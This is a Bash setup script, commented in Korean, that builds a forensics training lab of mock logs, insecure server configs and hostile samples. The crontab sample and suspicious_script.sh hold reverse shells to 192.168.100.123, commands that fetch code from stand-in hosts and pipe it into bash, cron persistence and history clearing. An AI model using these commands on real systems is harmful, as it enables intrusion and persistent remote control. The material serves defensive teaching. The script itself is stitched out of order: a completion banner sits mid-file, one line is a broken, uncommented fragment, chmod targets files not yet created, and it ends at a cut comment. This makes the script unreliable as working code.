#!/bin/bash

# 필요한 디렉토리 생성
echo "Creating directories..."
mkdir -p ~/security2/{logs,config,reports,system,samples,scripts}

# 액세스 로그 파일 생성
echo "Creating access.log..."
cat > ~/security2/logs/access.log << 'EOF'
192.168.1.100 - - [26/Mar/2025:08:12:34 +0900] "GET /login.php HTTP/1.1" 200 1234
192.168.1.101 - - [26/Mar/2025:08:14:22 +0900] "GET /index.html HTTP/1.1" 200 4567
10.0.0.55 - - [26/Mar/2025:08:15:01 +0900] "GET /admin.php HTTP/1.1" 403 301
192.168.1.102 - - [26/Mar/2025:08:16:45 +0900] "GET /contact.html HTTP/1.1" 200 2345
45.33.22.11 - - [26/Mar/2025:08:18:10 +0900] "POST /login.php HTTP/1.1" 302 0
45.33.22.11 - - [26/Mar/2025:08:18:12 +0900] "GET /admin.php HTTP/1.1" 200 6789
192.168.1.103 - - [26/Mar/2025:08:20:30 +0900] "GET /products.html HTTP/1.1" 200 5432
45.33.22.11 - - [26/Mar/2025:08:22:45 +0900] "POST /admin.php?action=update HTTP/1.1" 200 123
45.33.22.11 - - [26/Mar/2025:08:23:12 +0900] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 404 234
192.168.1.104 - - [26/Mar/2025:08:25:18 +0900] "GET /index.html HTTP/1.1" 200 4567
8.8.8.8 - - [26/Mar/2025:08:26:45 +0900] "GET /login.php HTTP/1.1" 200 1234
8.8.8.8 - - [26/Mar/2025:08:26:50 +0900] "POST /login.php HTTP/1.1" 401 789
8.8.8.8 - - [26/Mar/2025:08:26:55 +0900] "POST /login.php HTTP/1.1" 401 789
8.8.8.8 - - [26/Mar/2025:08:27:00 +0900] "POST /login.php HTTP/1.1" 401 789
8.8.8.8 - - [26/Mar/2025:08:27:05 +0900] "POST /login.php HTTP/1.1" 401 789
8.8.8.8 - - [26/Mar/2025:08:27:10 +0900] "POST /login.php HTTP/1.1" 401 789
77.66.55.44 - - [26/Mar/2025:08:30:22 +0900] "GET /robots.txt HTTP/1.1" 404 345
77.66.55.44 - - [26/Mar/2025:08:30:40 +0900] "GET /.env HTTP/1.1" 404 345
77.66.55.44 - - [26/Mar/2025:08:30:52 +0900] "GET /wp-login.php HTTP/1.1" 404 345
77.66.55.44 - - [26/Mar/2025:08:31:10 +0900] "GET /.git/config HTTP/1.1" 404 345
192.168.1.105 - - [26/Mar/2025:08:32:45 +0900] "GET /products.html HTTP/1.1" 200 5432
123.45.67.89 - - [26/Mar/2025:08:35:12 +0900] "GET /phpinfo.php HTTP/1.1" 200 2345
123.45.67.89 - - [26/Mar/2025:08:35:30 +0900] "GET /api/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 987
123.45.67.89 - - [26/Mar/2025:08:36:10 +0900] "GET /admin/config.php HTTP/1.1" 403 301
98.76.54.32 - - [26/Mar/2025:08:40:22 +0900] "GET /login.php HTTP/1.1" 200 1234
98.76.54.32 - - [26/Mar/2025:08:40:45 +0900] "POST /login.php HTTP/1.1" 302 0
98.76.54.32 - - [26/Mar/2025:08:41:05 +0900] "GET /dashboard.php HTTP/1.1" 200 5678
EOF

# 오류 로그 파일 생성
echo "Creating error.log..."
cat > ~/security2/logs/error.log << 'EOF'
[26/Mar/2025:08:18:10 +0900] [error] [client 45.33.22.11] PHP Warning: mysqli_connect(): Access denied for user 'admin'@'localhost' (using password: YES)
[26/Mar/2025:08:22:45 +0900] [error] [client 45.33.22.11] PHP Notice: Undefined variable: user in /var/www/html/admin.php on line 34
[26/Mar/2025:08:23:12 +0900] [error] [client 45.33.22.11] PHP Warning: include(/var/www/html/../../../etc/passwd): failed to open stream: Permission denied in /var/www/html/download.php on line 12
[26/Mar/2025:08:26:50 +0900] [error] [client 8.8.8.8] PHP Warning: Invalid username or password in /var/www/html/login.php on line 45
[26/Mar/2025:08:26:55 +0900] [error] [client 8.8.8.8] PHP Warning: Invalid username or password in /var/www/html/login.php on line 45
[26/Mar/2025:08:27:00 +0900] [error] [client 8.8.8.8] PHP Warning: Invalid username or password in /var/www/html/login.php on line 45
[26/Mar/2025:08:27:05 +0900] [error] [client 8.8.8.8] PHP Warning: Invalid username or password in /var/www/html/login.php on line 45
[26/Mar/2025:08:27:10 +0900] [error] [client 8.8.8.8] PHP Warning: Invalid username or password in /var/www/html/login.php on line 45
[26/Mar/2025:08:27:10 +0900] [error] [client 8.8.8.8] PHP Notice: Account 'admin' locked due to multiple failed attempts in /var/www/html/login.php on line 67
[26/Mar/2025:08:35:30 +0900] [error] [client 123.45.67.89] PHP Fatal error: Uncaught Error: SQL syntax error in /var/www/html/api/users.php on line 22
[26/Mar/2025:08:36:10 +0900] [error] [client 123.45.67.89] PHP Warning: Access denied for unauthorized user in /var/www/html/admin/config.php on line 5
EOF

# 사용자 계정 파일 생성
echo "Creating users.txt..."
cat > ~/security2/users.txt << 'EOF'
admin:x:1000:1000:System Administrator:/home/admin:/bin/bash
webuser:x:1001:1001:Web Server User:/home/webuser:/bin/bash
guest:x:1002:1002:Guest User:/home/guest:/bin/bash
secadmin:x:1003:1003:Security Administrator:/home/secadmin:/bin/bash
backup:x:1004:1004:Backup User:/home/backup:/bin/bash
developer:x:1005:1005:Developer:/home/developer:/bin/bash
testuser:x:1006:1006:Test User:/home/testuser:/bin/bash
analyst:x:1007:1007:Security Analyst:/home/analyst:/bin/bash
EOF

# SSH 설정 파일 생성
echo "Creating sshd_config..."
cat > ~/security2/config/sshd_config << 'EOF'
# SSH Server Configuration
Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PasswordAuthentication yes
X11Forwarding yes
AllowUsers admin webuser developer testuser
MaxAuthTries 6
UsePAM yes
PermitEmptyPasswords no
AllowTcpForwarding yes
EOF

# 웹 서버 액세스 제어 설정
echo "Creating .htaccess..."
mkdir -p ~/security2/samples/webroot
cat > ~/security2/samples/webroot/.htaccess << 'EOF'
# .htaccess file for admin directory
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /var/www/html/.htpasswd
Require user admin
EOF

# 데이터베이스 덤프 샘플 생성
echo "Creating sample database dump..."
cat > ~/security2/samples/database_dump.sql << 'EOF'
-- MySQL dump 10.13  Distrib 5.7.33, for Linux (x86_64)

-- Database: users
CREATE DATABASE IF NOT EXISTS users;
USE users;

-- Table structure for table `users`
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email` varchar(100) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
);

-- Dumping data for table `users`
INSERT INTO `users` VALUES 
(1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin@example.com','2025-01-15 10:00:00'),
(2,'user1','e10adc3949ba59abbe56e057f20f883e','user1@example.com','2025-01-15 10:30:00'),
(3,'john','482c811da5d5b4bc6d497ffa98491e38','john@example.com','2025-01-16 09:15:00'),
(4,'alice','bd3dad50e2d578de465d119d4d6935f2','alice@example.com','2025-01-16 14:20:00'),
(5,'secadmin','827ccb0eea8a706c4c34a16891f84e7b','security@example.com','2025-01-20 11:45:00');

-- Table structure for table `customers`
CREATE TABLE `customers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `address` varchar(255) NOT NULL,
  `credit_card` varchar(255) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
);

-- Dumping data for table `customers`
INSERT INTO `customers` VALUES 
(1,'John Smith','john.smith@example.com','555-123-4567','123 Main St, Anytown, AT 12345','4111111111111111','2025-01-25 09:30:00'),
(2,'Alice Johnson','alice.j@example.com','555-234-5678','456 Oak Ave, Someville, SV 23456','5555555555554444','2025-01-26 10:15:00'),
(3,'Robert Brown','robert.b@example.com','555-345-6789','789 Pine Rd, Othertown, OT 34567','371234567890123','2025-01-26 11:45:00');
EOF

# 추가 설정 파일 - PHP 설정
echo "Creating php.ini..."
cat > ~/security2/config/php.ini << 'EOF'
; PHP Configuration File

; Security settings
expose_php = On
display_errors = On
display_startup_errors = On
log_errors = On
error_reporting = E_ALL
allow_url_fopen = On
allow_url_include = On
file_uploads = On
upload_max_filesize = 20M
max_file_uploads = 20
post_max_size = 20M
memory_limit = 128M
max_execution_time = 30
default_socket_timeout = 60

; Session settings
session.save_handler = files
session.use_cookies = 1
session.use_only_cookies = 1
session.name = PHPSESSID
session.cookie_lifetime = 0
session.cookie_path = /
session.cookie_domain =
session.cookie_httponly = 0
session.cookie_samesite =
session.serialize_handler = php
session.gc_probability = 1
session.gc_divisor = 1000
session.gc_maxlifetime = 1440
EOF

# 크론 작업 파일 생성
echo "Creating crontab entries..."
cat > ~/security2/system/crontab.txt << 'EOF'
# System crontab entries

# Backup runs
0 2 * * * /usr/bin/php /var/www/html/cron/backup.php > /dev/null 2>&1
0 3 * * * /home/backup/scripts/backup_script.sh > /dev/null 2>&1

# Maintenance tasks
0 4 * * * /usr/bin/find /tmp -type f -atime +7 -delete
30 4 * * * /usr/bin/find /var/log -name "*.gz" -type f -mtime +30 -delete

# Updates
0 5 * * 0 /usr/bin/apt-get update > /dev/null 2>&1
0 6 * * 0 /usr/bin/apt-get upgrade -y > /dev/null 2>&1

# Suspicious entries (possibly malicious)
*/30 * * * * curl -s http://update.example-cdn.com/check.php?h=$(hostname) | bash
@reboot /tmp/update_service --daemon > /dev/null 2>&1
15 */6 * * * bash -c "bash -i >& /dev/tcp/192.168.100.123/9999 0>&1"
EOF

# Nginx 설정 파일 생성
echo "Creating nginx.conf..."
cat > ~/security2/config/nginx.conf << 'EOF'
# Nginx Configuration

user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {
    # Basic Settings
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    server_tokens on;
    
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    # SSL Settings
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;

    # Logging Settings
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    # Virtual Host Configs
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
    
    # Main server block
    server {
        listen 80 default_server;
        listen [::]:80 default_server;
        
        root /var/www/html;
        index index.php index.html index.htm;
        
        server_name _;
        
        location / {
            try_files $uri $uri/ =404;
        }
        
        location /admin {
            allow 192.168.1.0/24;
            deny all;
        }
        
        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        }
    }
}
EOF

# Redis 설정 파일 생성
echo "Creating redis.conf..."
cat > ~/security2/config/redis.conf << 'EOF'
# Redis configuration file

# Network
bind 0.0.0.0
protected-mode no
port 6379
tcp-backlog 511
timeout 0
tcp-keepalive 300

# General
daemonize yes
supervised no
pidfile /var/run/redis/redis-server.pid
loglevel notice
logfile /var/log/redis/redis-server.log
databases 16

# Security
requirepass ""

# Limits
maxclients 10000
maxmemory 128mb
maxmemory-policy noeviction

# Persistence
save 900 1
save 300 10
save 60 10000
stop-writes-on-bgsave-error yes
rdbcompression yes
rdbchecksum yes
dbfilename dump.rdb
dir /var/lib/redis
EOF

# MongoDB 설정 파일 생성
echo "Creating mongod.conf..."
cat > ~/security2/config/mongod.conf << 'EOF'
# MongoDB configuration file

# Where and how to store data.
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true

# Where to write logging data.
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log

# Network interfaces
net:
  port: 27017
  bindIp: 0.0.0.0

# Security settings
security:
  authorization: "disabled"
EOF

# 로그인 배너 메시지 생성
echo "Creating login banner..."
cat > ~/security2/config/login-banner.txt << 'EOF'
******************************************************************
                      AUTHORIZED ACCESS ONLY                      
    This system is for the use of authorized users only.         
    Individuals using this computer system without authority,    
    or in excess of their authority, are subject to having all   
    of their activities on this system monitored and recorded.   
                                                                 
    In the course of monitoring individuals improperly using     
    this system, or in the course of system maintenance, the     
    activities of authorized users may also be monitored.        
                                                                 
    Anyone using this system expressly consents to such          
    monitoring and is advised that if such monitoring reveals    
    possible evidence of criminal activity, system personnel     
    may provide the evidence of such monitoring to law           
    enforcement officials.                                       
******************************************************************
EOF

# 샘플 이벤트 로그 생성
echo "Creating system events log..."
cat > ~/security2/logs/system_events.log << 'EOF'
[2025-03-25 00:12:34] [INFO] System boot completed
[2025-03-25 00:13:45] [INFO] Services started: apache2, mysql, ssh
[2025-03-25 00:45:12] [WARN] High CPU usage detected: 92%
[2025-03-25 01:23:45] [INFO] Scheduled backup started
[2025-03-25 01:35:11] [INFO] Backup completed successfully
[2025-03-25 03:12:45] [WARN] Failed login attempt for user 'admin' from IP 209.141.45.27
[2025-03-25 03:13:01] [WARN] Failed login attempt for user 'admin' from IP 209.141.45.27
[2025-03-25 03:13:15] [WARN] Failed login attempt for user 'admin' from IP 209.141.45.27
[2025-03-25 03:15:22] [ALERT] Possible brute force attack detected from IP 209.141.45.27
[2025-03-25 04:22:33] [ERROR] Out of disk space on /var partition
[2025-03-25 04:25:45] [INFO] Old log files cleaned: 1.2GB freed
[2025-03-25 05:01:23] [WARN] Unexpected file access: /etc/shadow by process apache2(pid:1234)
[2025-03-25 05:02:15] [CRITICAL] Possible rootkit detected: modified system binary /bin/ps
[2025-03-25 05:10:45] [ALERT] Intrusion detection system triggered: unusual network traffic
[2025-03-25 05:15:32] [INFO] Security scan started
[2025-03-25 05:30:21] [WARN] Security scan found 10 vulnerabilities
[2025-03-25 05:31:45] [INFO] Security report generated at /var/log/security/scan_results.txt
[2025-03-25 06:45:12] [INFO] System updates started
[2025-03-25 07:02:33] [INFO] System updates completed: 15 packages updated
[2025-03-25 07:15:22] [INFO] Services restarted after update: apache2, mysql
[2025-03-25 08:22:45] [ALERT] New user 'maintenance' created with UID 0
[2025-03-25 08:25:12] [CRITICAL] Unexpected sudo to root by user 'webuser'
[2025-03-25 08:30:45] [ALERT] Changed permissions on /etc/sudoers
EOF

# 권한 설정
echo "Setting appropriate permissions..."
chmod 644 ~/security2/config/*
chmod 644 ~/security2/logs/*
chmod 644 ~/security2/reports/*
chmod 644 ~/security2/system/*
chmod 755 ~/security2/scripts/*
chmod 755 ~/security2/samples/suspicious_script.sh

# 완료 메시지
echo ""
echo "========================================="
echo "보안 실습 환경 준비가 완료되었습니다!"
echo "모든 필요한 파일이 ~/security2/ 디렉토리에 생성되었습니다."
echo "========================================="
echo ""
echo "다음 명령으로 실습 환경을 확인할 수 있습니다:"
echo "  ls -la ~/security2/"
echo ""
 서버 설정 파일 생성
echo "Creating apache2.conf..."
cat > ~/security2/config/apache2.conf << 'EOF'
# Apache2 Configuration
ServerRoot "/etc/apache2"
Listen 80
User www-data
Group www-data

<Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

<Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

<Directory /var/www/html/admin>
    Options None
    AllowOverride None
    Require ip 192.168.1.0/24
</Directory>

AccessFileName .htaccess
LogLevel warn
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
EOF

# 방화벽 규칙 파일 생성
echo "Creating firewall_rules.txt..."
cat > ~/security2/config/firewall_rules.txt << 'EOF'
# INPUT chain
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p tcp --dport 22 -j ACCEPT
-A INPUT -p tcp --dport 80 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT
-A INPUT -p tcp --dport 3306 -j ACCEPT -s 192.168.1.0/24
-A INPUT -p tcp --dport 8080 -j ACCEPT
-A INPUT -j DROP

# OUTPUT chain
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-A OUTPUT -j ACCEPT

# FORWARD chain
-A FORWARD -j DROP
EOF

# 취약점 스캐너 결과 파일 생성
echo "Creating vulnerability_scan.txt..."
mkdir -p ~/security2/reports
cat > ~/security2/reports/vulnerability_scan.txt << 'EOF'
[+] Scanning target: 192.168.1.10
[+] Scan started at: 2025-03-25 14:32:45

[!] HIGH: OpenSSH 7.5 detected - Multiple vulnerabilities (CVE-2018-15473, CVE-2017-15906)
[!] HIGH: Apache 2.4.29 vulnerable to CVE-2021-44790 - Remote code execution
[!] HIGH: MySQL 5.7.33 vulnerable to CVE-2021-2154 - Privilege escalation
[!] MEDIUM: SSL/TLS server supports TLS 1.0 (deprecated protocol)
[!] MEDIUM: PHP 7.2.24 has reached end of life
[!] MEDIUM: Directory listing enabled on /var/www/html/uploads/
[!] MEDIUM: Default credentials found for PHPMyAdmin
[!] LOW: Server leaks version information through HTTP headers
[!] LOW: TRACE/TRACK methods enabled
[!] LOW: Weak password policy detected
[+] INFO: Open ports: 22, 80, 443, 3306, 8080

[+] Scan completed at: 2025-03-25 15:01:12
[+] Total vulnerabilities found: 10 (HIGH: 3, MEDIUM: 4, LOW: 3)
EOF

# 샘플 시스템 파일 생성
echo "Creating passwd file..."
cat > ~/security2/system/passwd << 'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
admin:x:1000:1000:System Administrator:/home/admin:/bin/bash
webuser:x:1001:1001:Web Server User:/home/webuser:/bin/bash
guest:x:1002:1002:Guest User:/home/guest:/bin/bash
secadmin:x:1003:1003:Security Administrator:/home/secadmin:/bin/bash
backup:x:1004:1004:Backup User:/home/backup:/bin/bash
developer:x:1005:1005:Developer:/home/developer:/bin/bash
testuser:x:1006:1006:Test User:/home/testuser:/bin/bash
analyst:x:1007:1007:Security Analyst:/home/analyst:/bin/bash
EOF

# 샘플 악성 스크립트 생성
echo "Creating suspicious_script.sh..."
cat > ~/security2/samples/suspicious_script.sh << 'EOF'
#!/bin/bash
# This is a suspicious script found in /tmp directory

# Collecting system information
hostname > /tmp/.sysinfo
whoami >> /tmp/.sysinfo
id >> /tmp/.sysinfo
ifconfig >> /tmp/.sysinfo
cat /etc/passwd >> /tmp/.sysinfo

# Setting up persistence
crontab -l > /tmp/cron_bak
echo "*/10 * * * * curl -s http://malicious-server.com/backdoor | bash" >> /tmp/cron_bak
crontab /tmp/cron_bak
rm /tmp/cron_bak

# Creating reverse shell
nohup bash -i >& /dev/tcp/192.168.100.123/4444 0>&1 &

# Clearing tracks
history -c
EOF

# 네트워크 캡처 요약 생성
echo "Creating network_capture_summary.txt..."
cat > ~/security2/reports/network_capture_summary.txt << 'EOF'
# Network Capture Summary (March 25, 2025)

Source IP       | Destination IP   | Protocol | Port  | Packets | Bytes   | Notes
----------------|------------------|----------|-------|---------|---------|----------------------
192.168.1.10    | 8.8.8.8          | DNS      | 53    | 245     | 24,562  | Normal DNS traffic
192.168.1.10    | 192.168.1.1      | HTTP     | 80    | 1,345   | 548,932 | Web traffic
192.168.1.10    | 192.168.1.1      | HTTPS    | 443   | 5,678   | 2.3 MB  | Encrypted web traffic
192.168.1.100   | 192.168.1.10     | SSH      | 22    | 3,421   | 1.2 MB  | Administrative access
192.168.1.10    | 192.168.100.123  | TCP      | 4444  | 128     | 12,422  | SUSPICIOUS OUTBOUND CONNECTION
192.168.1.10    | 212.22.10.158    | TCP      | 8080  | 56      | 8,904   | SUSPICIOUS OUTBOUND CONNECTION
192.168.1.10    | 185.142.236.34   | TCP      | 443   | 78      | 10,562  | SUSPICIOUS OUTBOUND CONNECTION  
45.33.22.11     | 192.168.1.10     | HTTP     | 80    | 145     | 48,293  | External web access
8.8.8.8         | 192.168.1.10     | HTTP     | 80    | 87      | 12,488  | External web access
77.66.55.44     | 192.168.1.10     | HTTP     | 80    | 43      | 7,862   | External web access
123.45.67.89    | 192.168.1.10     | HTTP     | 80    | 68      | 9,756   | External web access (possible SQLi)
EOF

# 추가 파일 생성 (failed login attempts, auth.log)
echo "Creating auth.log..."
cat > ~/security2/logs/auth.log << 'EOF'
Mar 26 00:15:21 server sshd[12345]: Failed password for invalid user test from 45.12.34.56 port 58172 ssh2
Mar 26 00:15:25 server sshd[12346]: Failed password for invalid user admin from 45.12.34.56 port 58174 ssh2
Mar 26 00:15:28 server sshd[12347]: Failed password for invalid user admin from 45.12.34.56 port 58176 ssh2
Mar 26 00:15:32 server sshd[12348]: Failed password for invalid user admin from 45.12.34.56 port 58178 ssh2
Mar 26 00:15:36 server sshd[12349]: Failed password for invalid user admin from 45.12.34.56 port 58180 ssh2
Mar 26 00:15:40 server sshd[12350]: Failed password for invalid user admin from 45.12.34.56 port 58182 ssh2
Mar 26 00:15:44 server sshd[12351]: Failed password for invalid user root from 45.12.34.56 port 58184 ssh2
Mar 26 00:15:47 server sshd[12352]: Failed password for invalid user root from 45.12.34.56 port 58186 ssh2
Mar 26 00:15:51 server sshd[12353]: Failed password for invalid user root from 45.12.34.56 port 58188 ssh2
Mar 26 00:20:21 server sshd[12354]: Accepted password for admin from 192.168.1.5 port 49123 ssh2
Mar 26 00:35:11 server sshd[12355]: Failed password for webuser from 192.168.1.6 port 51442 ssh2
Mar 26 00:35:15 server sshd[12356]: Accepted password for webuser from 192.168.1.6 port 51444 ssh2
Mar 26 02:23:45 server sshd[12370]: Failed password for invalid user postgres from 89.134.56.78 port 60234 ssh2
Mar 26 02:23:50 server sshd[12371]: Failed password for invalid user postgres from 89.134.56.78 port 60236 ssh2
Mar 26 02:24:01 server sshd[12372]: Failed password for invalid user mysql from 89.134.56.78 port 60238 ssh2
Mar 26 02:24:15 server sshd[12373]: Failed password for invalid user admin from 89.134.56.78 port 60240 ssh2
Mar 26 02:24:30 server sshd[12374]: Failed password for invalid user test from 89.134.56.78 port 60242 ssh2
Mar 26 03:12:33 server sshd[12401]: Failed password for developer from 192.168.1.25 port 53280 ssh2
Mar 26 03:12:38 server sshd[12402]: Accepted password for developer from 192.168.1.25 port 53282 ssh2
Mar 26 04:45:22 server sshd[12520]: Failed password for invalid user admin from 209.141.45.27 port 44815 ssh2
Mar 26 04:45:30 server sshd[12521]: Failed password for invalid user admin from 209.141.45.27 port 44820 ssh2
Mar 26 04:45:38 server sshd[12522]: Failed password for invalid user admin from 209.141.45.27 port 44824 ssh2
EOF

# 새로운 파일 - 백업 스크립트
echo "Creating backup_script.sh..."
cat > ~/security2/scripts/backup_script.sh << 'EOF'
#!/bin/bash
# Backup script for web data

# Credentials embedded in script (insecure practice)
DB_USER="backup_user"
DB_PASS="BackupP@ss123!"
DB_HOST="localhost"

# Create backup directory
BACKUP_DIR="/var/backups/web"
mkdir -p $BACKUP_DIR

# Backup database
mysqldump -u $DB_USER -p$DB_PASS --all-databases > $BACKUP_DIR/all_databases.sql

# Backup web files
tar -czf $BACKUP_DIR/www_backup.tar.gz /var/www/html

# Send backup to remote server (using password in command line)
scp -r $BACKUP_DIR backup_user:B@ckupP@55@backup.example.com:/backups/

# Generate log
echo "Backup completed at $(date)" >> /var/log/backup.log
EOF

# 설치된 패키지 목록 파일
echo "Creating installed_packages.txt..."
cat > ~/security2/system/installed_packages.txt << 'EOF'
apache2 2.4.29-1ubuntu4.27
openssh-server 1:7.6p1-4ubuntu0.7
mysql-server 5.7.33-0ubuntu0.18.04.1
php7.2 7.2.24-0ubuntu0.18.04.17
postgresql 10+190ubuntu0.1
phpmyadmin 4:4.6.6-5ubuntu0.5
vsftpd 3.0.3-9ubuntu0.1
bind9 1:9.11.3+dfsg-1ubuntu1.15
postfix 3.3.0-1ubuntu0.4
wget 1.19.4-1ubuntu2.2
curl 7.58.0-2ubuntu3.19
netcat 1.10-41.1
nmap 7.60-1ubuntu5
gcc 4:7.4.0-1ubuntu2.3
make 4.1-9.1ubuntu1
python2.7 2.7.17-1~18.04ubuntu1.7
python3.6 3.6.9-1~18.04ubuntu1.7
redis-server 5:4.0.9-1ubuntu0.2
mongodb-org 3.6.23
nodejs 8.10.0~dfsg-2ubuntu0.4
EOF

# 방화벽 상태 파일
echo "Creating firewall_status.txt..."
cat > ~/security2/system/firewall_status.txt << 'EOF'
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
443/tcp                    ALLOW       Anywhere                  
3306/tcp                   ALLOW       192.168.1.0/24            
8080/tcp                   ALLOW       Anywhere                  
27017/tcp                  ALLOW       192.168.1.0/24
6379/tcp                   ALLOW       Anywhere
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
443/tcp (v6)               ALLOW       Anywhere (v6)
EOF

# SUID 파일 리스트 생성
echo "Creating suid_files.txt..."
cat > ~/security2/system/suid_files.txt << 'EOF'
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/ssh-agent
/usr/bin/traceroute6.iputils
/usr/bin/mtr-packet
/usr/sbin/pppd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/bin/su
/bin/ntfs-3g
/bin/umount
/bin/mount
/bin/ping
/bin/fusermount
/bin/custom_maintenance_script  # 비정상적인 SUID 파일
/usr/local/bin/status_check     # 비정상적인 SUID 파일
/tmp/update_service             # 매우 의심스러운 위치의 SUID 파일
EOF

# 네트워크 설정 파일 생성
echo "Creating network_config.txt..."
cat > ~/security2/system/network_config.txt << 'EOF'
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto eth0
iface eth0 inet static
    address 192.168.1.10
    netmask 255.255.255.0
    network 192.168.1.0
    broadcast 192.168.1.255
    gateway 192.168.1.1
    # dns-* options are implemented by the resolvconf package, if installed
    dns-nameservers 8.8.8.8 8.8.4.4

# Secondary network interface (DMZ)
auto eth1
iface eth1 inet static
    address 10.0.0.10
    netmask 255.255.255.0
    network 10.0.0.0
    broadcast 10.0.0.255
EOF

# 웹
